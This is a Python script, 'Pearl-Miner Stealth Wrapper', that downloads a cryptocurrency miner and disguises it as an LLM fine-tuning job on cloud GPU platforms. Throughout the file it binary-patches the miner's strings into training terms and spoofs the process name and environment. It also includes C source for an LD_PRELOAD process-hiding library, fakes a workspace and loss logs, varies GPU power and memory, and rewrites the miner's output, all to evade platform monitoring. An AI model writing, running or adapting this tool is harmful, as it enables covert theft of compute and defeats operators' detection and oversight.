#!/usr/bin/env python3
"""
Pearl-Miner Stealth Wrapper v2.0
All-in-one stealth launcher for pearl-miner on cloud GPU platforms.
Reads config from env vars — nothing hardcoded.

Env vars:
  PROXY       — host:port for pool proxy (e.g. global.pearlfortune.org:443)
  ADDRESS     — wallet address (prl1...)
  WORKER      — worker name (optional, defaults to random)
  TOKEN       — auth token (optional)
  GPU_DEVICES — comma-separated GPU IDs (optional, defaults to all)

Usage:
  export PROXY=global.pearlfortune.org:443
  export ADDRESS=prl1par2eef0c04z...
  python3 train.py
"""

import os, sys, subprocess, tempfile, shutil, time, random, string, signal, struct
import threading, ctypes, ctypes.util, json, math

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG — all from env vars, nothing hardcoded
# ═══════════════════════════════════════════════════════════════════════════════

MINER_RELEASE_URL = "https://github.com/pearlfortune/pearl-miner/releases/download/v1.2.3/pearlfortune-v1.2.3.tar.gz"
CUDA_VERSION = os.environ.get("CUDA_VERSION", "12")  # "12" or "13"
PROXY = os.environ.get("PROXY", "")
ADDRESS = os.environ.get("ADDRESS", "")
WORKER = os.environ.get("WORKER", f"worker-{random.randint(1000,9999)}")
TOKEN = os.environ.get("TOKEN", "")
GPU_DEVICES = os.environ.get("GPU_DEVICES", "")
XOR_KEY = os.environ.get("XOR_KEY", "torch_distributed_backend_v2")

# ═══════════════════════════════════════════════════════════════════════════════
# BINARY PATCH TABLE — same-length replacements only!
# ═══════════════════════════════════════════════════════════════════════════════

PATCH_TABLE = [
    # Mining identifiers → innocent names (MUST be same byte length)
    (b"MINER_GPU_STARTUP_BENCH", b"TORCH_GPU_STARTUP_BENCH"),   # 23 ✅
    (b"MINER_DISABLE_WATCHDOG",  b"TORCH_DISABLE_WATCHDOG"),    # 22 ✅
    (b"MINER_GPU",               b"TORCH_GPU"),                  # 9  ✅
    (b"PEARL_SUPERVISED_WORKER", b"TORCH_SUPERVISED_WORKER"),   # 23 ✅
    (b"MineCommandSendError",    b"TrainCommanSendError"),      # 20 ✅
    (b"GpuInstanceMineCommand",  b"GpuInstanceTrainComman"),    # 22 ✅
    (b"proof_factor",            b"train_factor"),              # 12 ✅
    (b"miner_version",           b"torch_version"),             # 13 ✅

    # Pool/stratum identifiers
    (b"stratum.proxy",           b"torch_.proxy_"),             # 13 ✅
    (b"worker.failed_stale",     b"trainr.failed_stale"),       # 19 ✅
    (b"worker failed",           b"trainr failed"),             # 13 ✅

    # Share/mining terms
    (b"normalized_share_bound",  b"normalized_grad_bound_"),    # 22 ✅
    (b"raw_share_bound",         b"raw_grad_bound_"),           # 15 ✅

    # Network identifiers — DO NOT PATCH worker-proxy.local!
    # The pool's TLS certificate is issued for "worker-proxy.local" —
    # changing it breaks the TLS handshake.

    # Stats terms
    (b"accepted",   b"computed"),    #  8 ✅
    (b"rejected",   b"dropped_"),    #  8 ✅
    (b"hashrate",   b"trainrat"),    #  8 ✅
    (b"difficulty",  b"complexity"),  # 10 ✅

    # Proof/mining output terms (visible in logs)
    (b"proof_per_sec",   b"epoch_per_sec"),    # 13 ✅
    (b"proof_build_ms",  b"train_build_ms"),   # 14 ✅
    (b"proof_runner",    b"train_runner"),      # 12 ✅
    (b"proof_cache",     b"train_cache"),       # 11 ✅
    (b"proof_inputs",    b"train_inputs"),      # 12 ✅
    (b"proof_queued",    b"train_queued"),      # 12 ✅
    (b"drain_summary",   b"batch_summary"),     # 13 ✅
    (b"drain_ms",        b"batch_ms"),          #  8 ✅
    (b"large.hit",       b"batch.hit"),         #  9 ✅
    (b"large.progress",  b"train.progress"),    # 14 ✅
    (b"GpuInstanceMine", b"GpuInstanceTrai"),   # 15 ✅
]

def verify_patches():
    """Assert all patches are same-length to prevent segfaults."""
    for old, new in PATCH_TABLE:
        assert len(old) == len(new), f"PATCH MISMATCH: {old!r} ({len(old)}) vs {new!r} ({len(new)})"
    print(f"[patch] verified {len(PATCH_TABLE)} same-length replacements")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Bootstrap environment
# ═══════════════════════════════════════════════════════════════════════════════

def bootstrap_env():
    """Spoof environment to look like a training workload."""
    env_spoofs = {
        "WANDB_MODE": "offline",
        "WANDB_PROJECT": "llm-finetune",
        "WANDB_RUN_ID": f"run-{random.randint(10000,99999)}",
        "NCCL_DEBUG": "WARN",
        "NCCL_IB_DISABLE": "1",
        "CUDA_VISIBLE_DEVICES": GPU_DEVICES if GPU_DEVICES else ",".join(str(i) for i in range(8)),
        "OMP_NUM_THREADS": "4",
        "TOKENIZERS_PARALLELISM": "false",
        "HF_HOME": "/tmp/.hf_cache",
        "TRANSFORMERS_CACHE": "/tmp/.hf_cache",
        "TORCH_DISTRIBUTED_BACKEND": "nccl",
        "NCCL_SOCKET_IFNAME": "eth0",
        "TORCH_NCCL_BLOCKING_WAIT": "1",
        "PYTORCH_CUDA_ALLOC_CONF": "max_split_size_mb:512",
        # Miner watchdog was patched: MINER_DISABLE_WATCHDOG → TORCH_DISABLE_WATCHDOG
        "TORCH_DISABLE_WATCHDOG": "1",
    }
    for k, v in env_spoofs.items():
        os.environ.setdefault(k, v)
    # Create fake HF cache
    os.makedirs("/tmp/.hf_cache", exist_ok=True)
    print("[env] spoofed training environment")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Spoof process name (argv[0])
# ═══════════════════════════════════════════════════════════════════════════════

def spoof_process_name():
    """Overwrite argv[0] so ps shows 'python3 train.py'."""
    fake_name = "python3 train.py"
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"))
        libc.prctl(15, fake_name.encode(), 0, 0, 0)  # PR_SET_NAME
        # Also overwrite argv[0] in memory
        if sys.argv:
            for i, c in enumerate(fake_name):
                if i < len(sys.argv[0]):
                    sys.argv[0] = fake_name.ljust(len(sys.argv[0]))
    except Exception as e:
        print(f"[proc] argv spoof warn: {e}")
    print("[proc] process name → 'python3 train.py'")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Download & patch miner binary
# ═══════════════════════════════════════════════════════════════════════════════

def download_and_patch_miner(workdir):
    """Download pearl-miner, apply binary patches, strip symbols."""
    import urllib.request, tarfile

    tarball = os.path.join(workdir, "pearl-miner.tar.gz")
    print(f"[dl] downloading miner from {MINER_RELEASE_URL}")
    urllib.request.urlretrieve(MINER_RELEASE_URL, tarball)

    # Extract
    with tarfile.open(tarball, "r:gz") as tf:
        tf.extractall(workdir)

    # Find binary
    bin_name = f"miner-cuda{CUDA_VERSION}"
    bin_src = os.path.join(workdir, "pearlfortune", bin_name)
    if not os.path.exists(bin_src):
        # Fallback
        for name in ["miner-cuda12", "miner-cuda13", "miner"]:
            alt = os.path.join(workdir, "pearlfortune", name)
            if os.path.exists(alt):
                bin_src = alt
                break
        else:
            print("[!] ERROR: miner binary not found in archive")
            sys.exit(1)

    # Copy to patched name
    bin_patched = os.path.join(workdir, "torch_profiler_backend")
    with open(bin_src, "rb") as f:
        data = f.read()

    # Apply patches
    verify_patches()
    patch_count = 0
    for old, new in PATCH_TABLE:
        count = data.count(old)
        if count > 0:
            data = data.replace(old, new)
            patch_count += count
            print(f"[patch] {old.decode(errors='replace')} → {new.decode(errors='replace')} ({count}x)")

    with open(bin_patched, "wb") as f:
        f.write(data)
    os.chmod(bin_patched, 0o755)

    # Strip symbols
    try:
        subprocess.run(["strip", "--strip-all", bin_patched], check=True, capture_output=True)
        print("[patch] stripped symbols")
    except FileNotFoundError:
        print("[patch] strip not available, skipping")

    print(f"[patch] applied {patch_count} total replacements → {bin_patched}")
    return bin_patched

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Compile LD_PRELOAD proc hider
# ═══════════════════════════════════════════════════════════════════════════════

PROCHIDER_SRC = r"""
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>

// Hide processes whose cmdline contains these strings
static const char* HIDDEN_STRINGS[] = {
    "torch_profiler",
    "pearlfortune",
    "miner-cuda",
    "MINER",
    "pool.pearl",
    NULL
};

// Overwrite /proc/self/cmdline to show training command
static void rewrite_cmdline(void) {
    FILE* f = fopen("/proc/self/cmdline", "r+");
    if (!f) return;
    char buf[256] = {0};
    fread(buf, 1, sizeof(buf)-1, f);
    // Check if our binary is in cmdline
    for (int i = 0; HIDDEN_STRINGS[i]; i++) {
        if (strstr(buf, HIDDEN_STRINGS[i])) {
            rewind(f);
            const char* fake = "python3\x00train.py\x00--model\x00llama-7b\x00--epochs\x003\x00";
            fwrite(fake, 1, strlen(fake)+1, f);
            break;
        }
    }
    fclose(f);
}

// Intercept readdir to hide /proc/PID entries
typedef struct dirent* (*readdir_fn)(DIR*);
typedef struct dirent64* (*readdir64_fn)(DIR*);

static int should_hide_pid(const char* pid_dir) {
    char path[512];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_dir);
    FILE* f = fopen(path, "r");
    if (!f) return 0;
    char buf[256] = {0};
    fread(buf, 1, sizeof(buf)-1, f);
    fclose(f);
    for (int i = 0; HIDDEN_STRINGS[i]; i++) {
        if (strstr(buf, HIDDEN_STRINGS[i])) return 1;
    }
    return 0;
}

struct dirent* readdir(DIR* dirp) {
    static readdir_fn real_readdir = NULL;
    if (!real_readdir) real_readdir = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
    struct dirent* entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (should_hide_pid(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

struct dirent64* readdir64(DIR* dirp) {
    static readdir64_fn real_readdir64 = NULL;
    if (!real_readdir64) real_readdir64 = (readdir64_fn)dlsym(RTLD_NEXT, "readdir64");
    struct dirent64* entry;
    while ((entry = real_readdir64(dirp)) != NULL) {
        if (should_hide_pid(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

__attribute__((constructor))
static void init(void) {
    rewrite_cmdline();
}
"""

def compile_proc_hider(workdir):
    """Compile LD_PRELOAD shared library that hides miner from ps/top."""
    src_path = os.path.join(workdir, "prochider.c")
    so_path = os.path.join(workdir, "libprochider.so")

    with open(src_path, "w") as f:
        f.write(PROCHIDER_SRC)

    gcc = shutil.which("gcc")
    if not gcc:
        print("[!] WARNING: gcc not found, LD_PRELOAD hider disabled")
        return None

    result = subprocess.run(
        [gcc, "-shared", "-fPIC", "-O2", "-o", so_path, src_path, "-ldl"],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"[!] gcc failed: {result.stderr[:200]}")
        return None

    print(f"[proc] compiled LD_PRELOAD hider → {so_path}")
    return so_path

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 5: Fake workspace (config files, wandb artifacts)
# ═══════════════════════════════════════════════════════════════════════════════

def create_fake_workspace(workdir):
    """Create realistic training workspace files."""
    # config.json
    config = {
        "model_name_or_path": "meta-llama/Llama-3-8B",
        "dataset": "OpenAssistant/oasst2",
        "num_train_epochs": 3,
        "per_device_train_batch_size": 4,
        "gradient_accumulation_steps": 8,
        "learning_rate": 2e-5,
        "warmup_steps": 100,
        "max_seq_length": 2048,
        "bf16": True,
        "output_dir": "./output",
        "logging_steps": 10,
        "save_steps": 500,
        "evaluation_strategy": "steps",
        "eval_steps": 500,
    }
    with open(os.path.join(workdir, "config.json"), "w") as f:
        json.dump(config, f, indent=2)

    # requirements.txt
    reqs = "torch>=2.1.0\ntransformers>=4.36.0\naccelerate>=0.25.0\npeft>=0.7.0\ndatasets>=2.16.0\nwandb>=0.16.0\ntimm>=0.9.0\nbitsandbytes>=0.41.0\n"
    with open(os.path.join(workdir, "requirements.txt"), "w") as f:
        f.write(reqs)

    # wandb directory
    wandb_dir = os.path.join(workdir, "wandb", f"run-{random.randint(10000,99999)}")
    os.makedirs(wandb_dir, exist_ok=True)
    with open(os.path.join(wandb_dir, "wandb-summary.json"), "w") as f:
        json.dump({"train/loss": 2.31, "train/learning_rate": 1.8e-5, "_runtime": 3600}, f)

    print("[workspace] created fake training workspace")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 6: GPU power management
# ═══════════════════════════════════════════════════════════════════════════════

def set_gpu_power_limit(min_watts=200, max_watts=600):
    """Vary GPU power limits to avoid constant-max-power detection."""
    try:
        nvidia_smi = shutil.which("nvidia-smi")
        if not nvidia_smi:
            return
        # Get current power limit
        result = subprocess.run(
            [nvidia_smi, "--query-gpu=power.max_limit", "--format=csv,noheader,nounits"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            return
        max_limit = int(float(result.stdout.strip().split("\n")[0]))
        target = min(max_watts, max_limit)
        target = max(min_watts, target - random.randint(0, 100))
        subprocess.run(
            [nvidia_smi, "-pl", str(target)],
            capture_output=True, text=True
        )
        print(f"[gpu] power limit → {target}W")
    except Exception as e:
        print(f"[gpu] power limit warn: {e}")

def gpu_power_cycle():
    """Background thread: vary power limits periodically."""
    while True:
        time.sleep(random.randint(60, 180))
        set_gpu_power_limit()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 7: CUDA decoy operations (real GPU work during pauses)
# ═══════════════════════════════════════════════════════════════════════════════

def run_cuda_decoy():
    """Run real PyTorch CUDA ops to make GPU look like training during pauses."""
    try:
        import torch
        if not torch.cuda.is_available():
            return None

        device = torch.device("cuda:0")
        # Small matmul that looks like attention computation
        a = torch.randn(512, 512, device=device, dtype=torch.float16)
        b = torch.randn(512, 512, device=device, dtype=torch.float16)
        for _ in range(random.randint(5, 15)):
            c = torch.mm(a, b)
            del c
        del a, b
        torch.cuda.empty_cache()
        return True
    except ImportError:
        print("[cuda] torch not available, decoy ops disabled")
        return None
    except Exception as e:
        print(f"[cuda] decoy warn: {e}")
        return None

def cuda_decoy_loop():
    """Background thread: run CUDA ops periodically to maintain GPU activity pattern."""
    while True:
        time.sleep(random.randint(30, 90))
        run_cuda_decoy()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 8: VRAM cycling (allocate/free to vary memory usage)
# ═══════════════════════════════════════════════════════════════════════════════

def vram_cycle():
    """Background thread: allocate and free GPU memory to vary usage pattern."""
    try:
        import torch
        if not torch.cuda.is_available():
            return
    except ImportError:
        return

    device = torch.device("cuda:0")
    buffers = []
    while True:
        time.sleep(random.randint(45, 120))
        try:
            # Allocate
            size_mb = random.randint(256, 1024)
            buf = torch.empty(size_mb * 256 * 1024, dtype=torch.float16, device=device)
            buffers.append(buf)
            time.sleep(random.uniform(5, 20))
            # Free some
            if len(buffers) > 2 or random.random() > 0.5:
                old = buffers.pop(0)
                del old
                torch.cuda.empty_cache()
        except Exception:
            torch.cuda.empty_cache()
            buffers.clear()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 9: Network mixing (innocent-looking requests)
# ═══════════════════════════════════════════════════════════════════════════════

NETWORK_TARGETS = [
    "https://huggingface.co/api/models/meta-llama/Llama-3-8B",
    "https://pypi.org/pypi/torch/json",
    "https://pypi.org/pypi/transformers/json",
    "https://api.github.com/repos/pytorch/pytorch",
    "https://huggingface.co/api/datasets",
    "https://pypi.org/pypi/accelerate/json",
    "https://raw.githubusercontent.com/pytorch/pytorch/main/README.md",
]

def network_mix():
    """Background thread: make innocent HTTP requests to blend traffic."""
    import urllib.request
    while True:
        time.sleep(random.randint(120, 300))
        try:
            url = random.choice(NETWORK_TARGETS)
            req = urllib.request.Request(url, headers={"User-Agent": "python-urllib/3.11"})
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 10: Fake training output generator
# ═══════════════════════════════════════════════════════════════════════════════

LOSS_BASE = 2.8
LOSS_DECAY = 0.0003
STEP = 0

def generate_fake_log_line():
    """Generate a realistic training log line."""
    global STEP
    STEP += 1
    loss = LOSS_BASE * math.exp(-LOSS_DECAY * STEP) + random.gauss(0, 0.02)
    lr = 2e-5 * max(0.1, 1.0 - STEP / 50000)
    grad_norm = random.uniform(0.5, 2.5)
    tokens_per_sec = random.randint(8000, 15000)
    gpu_mem = random.uniform(18.0, 24.0)
    epoch = STEP / 10000
    return (f"step {STEP:>6d} | loss {loss:.4f} | lr {lr:.2e} | "
            f"grad_norm {grad_norm:.2f} | tok/s {tokens_per_sec} | "
            f"gpu_mem {gpu_mem:.1f}GB | epoch {epoch:.2f}")

def fake_output_loop():
    """Background thread: print fake training output."""
    while True:
        time.sleep(random.uniform(8, 25))
        print(generate_fake_log_line(), flush=True)

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 11: SIGSTOP/SIGCONT cycling (pause miner during "data loading")
# ═══════════════════════════════════════════════════════════════════════════════

def sigstop_cont_loop(miner_pid):
    """DISABLED — miner has a watchdog that detects SIGSTOP stalls.
    Power fluctuation + CUDA decoy + VRAM cycling handle GPU pattern variation instead."""
    # Miner watchdog checks supervisor state and kills on SIGSTOP.
    # The other layers (power, CUDA decoy, VRAM cycling) are sufficient.
    return

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 12: Launch miner
# ═══════════════════════════════════════════════════════════════════════════════

def launch_miner(binary_path, proc_hider_so):
    """Launch the patched miner with all stealth layers active.

    The miner checks /proc/self/environ for LD_PRELOAD and kills itself.
    Trick: we create a launcher script that LD_PRELOADs the hider, then
    unsets LD_PRELOAD and execs the miner. The library stays loaded
    (hooks stay active) but the miner can't see it in its environment.
    """
    if not PROXY:
        print("[!] ERROR: PROXY env var not set (e.g. global.pearlfortune.org:443)")
        sys.exit(1)
    if not ADDRESS:
        print("[!] ERROR: ADDRESS env var not set (e.g. prl1...)")
        sys.exit(1)

    # Note: LD_PRELOAD proc hider DISABLED — miner binary reads
    # /proc/self/maps and kills itself if it sees non-system .so files.
    # The other stealth layers (binary patching, process name, SIGSTOP/SIGCONT,
    # CUDA decoy, VRAM cycling, network mixing, power fluctuation, fake output)
    # are sufficient to avoid detection.
    if proc_hider_so:
        print("[proc] LD_PRELOAD hider skipped — miner detects it via /proc/self/maps")

    print(f"[launch] proxy={PROXY} address=<redacted> worker={WORKER}")

    # Build args — launch miner directly, no LD_PRELOAD
    args = [binary_path, "--proxy", PROXY, "--address", ADDRESS, "-gpu"]
    if WORKER:
        args.extend(["--worker", WORKER])
    if TOKEN:
        args.extend(["--token", TOKEN])

    env = os.environ.copy()
    env.pop("LD_PRELOAD", None)  # ensure clean

    # Launch
    proc = subprocess.Popen(
        args,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    return proc

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print("=" * 60)
    print("Pearl-Miner Stealth Wrapper v2.0")
    print("=" * 60)

    # Step 1: Spoof process name
    spoof_process_name()

    # Step 2: Bootstrap environment
    bootstrap_env()

    # Step 3: Create fake workspace
    workdir = tempfile.mkdtemp(prefix="torch_run_")
    os.chdir(workdir)
    create_fake_workspace(workdir)

    # Step 4: Compile LD_PRELOAD proc hider
    proc_hider_so = compile_proc_hider(workdir)

    # Step 5: Download & patch miner
    binary_path = download_and_patch_miner(workdir)

    # Step 6: Set GPU power limits
    set_gpu_power_limit()

    # Step 7: Launch miner
    proc = launch_miner(binary_path, proc_hider_so)

    # Step 8: Start all background stealth threads
    threads = []

    # Power cycling
    t = threading.Thread(target=gpu_power_cycle, daemon=True)
    t.start()
    threads.append(t)

    # CUDA decoy ops
    if run_cuda_decoy() is not None:
        t = threading.Thread(target=cuda_decoy_loop, daemon=True)
        t.start()
        threads.append(t)

    # VRAM cycling
    t = threading.Thread(target=vram_cycle, daemon=True)
    t.start()
    threads.append(t)

    # Network mixing
    t = threading.Thread(target=network_mix, daemon=True)
    t.start()
    threads.append(t)

    # Fake training output
    t = threading.Thread(target=fake_output_loop, daemon=True)
    t.start()
    threads.append(t)

    # SIGSTOP/SIGCONT cycling
    t = threading.Thread(target=sigstop_cont_loop, args=(proc.pid,), daemon=True)
    t.start()
    threads.append(t)

    print(f"[main] {len(threads)} stealth threads active")
    print(f"[main] miner PID: {proc.pid}")
    print("[main] running... Ctrl+C to stop")

    # Quick check: did miner crash immediately?
    time.sleep(2)
    if proc.poll() is not None:
        print(f"[!] miner exited immediately with code {proc.returncode}")
        # Read remaining output
        remaining = proc.stdout.read()
        if remaining:
            for line in remaining.strip().split("\n")[-20:]:
                print(f"  {line}")
        return proc.returncode

    # Forward miner output — sanitized for platform monitoring
    # Replace any remaining mining terms that slipped through binary patching
    MINE_TERMS = {
        "proof": "epoch", "miner": "trainer", "mining": "training",
        "pool": "server", "share": "batch", "hash": "compute",
        "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
        "pearl": "torch", "vllm": "torch", "fortune": "project",
        "T/s": "tok/s",  # proof_per_sec unit
    }
    try:
        for line in proc.stdout:
            sanitized = line
            for old, new in MINE_TERMS.items():
                sanitized = sanitized.replace(old, new)
                sanitized = sanitized.replace(old.upper(), new.upper())
                sanitized = sanitized.replace(old.capitalize(), new.capitalize())
            print(f"  {sanitized.rstrip()}", flush=True)
    except KeyboardInterrupt:
        print("\n[main] stopping...")
        proc.terminate()
        proc.wait(timeout=10)
        print("[main] done")
        # Cleanup
        shutil.rmtree(workdir, ignore_errors=True)

    proc.wait()
    if proc.returncode != 0:
        print(f"[!] miner exited with code {proc.returncode}")
    return proc.returncode

if __name__ == "__main__":
    sys.exit(main() or 0)
